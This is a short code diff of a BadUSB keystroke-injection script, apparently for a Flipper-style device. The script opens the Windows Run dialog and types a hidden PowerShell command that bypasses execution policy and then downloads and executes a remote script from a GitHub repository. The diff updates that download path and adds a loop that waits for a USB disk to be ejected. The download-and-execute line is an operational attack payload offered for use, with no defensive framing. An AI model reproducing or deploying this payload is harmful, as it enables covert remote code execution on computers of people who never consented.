@@ -76,7 +76,7 @@ notify.success();
 badusb.press("GUI", "r");
 delay(500);
 badusb.println(
-  "powershell -w h -Ep Bypass irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/Script-runner/Run-script.ps1 | iex"
+  "powershell -w h -Ep Bypass irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/JS/Script-runner/Run-script.ps1 | iex"
 );
 badusb.quit();
 delay(4000);
@@ -84,3 +84,11 @@ print("Running script");
 
 usbdisk.start(diskPath);
 notify.success();
+while (!usbdisk.wasEjected()) {
+  notify.blink("green", "long");
+  delay(1000);
+}
+notify.success();
+print("Ejected, stopping UsbDisk...");
+usbdisk.stop();
+print("Done");
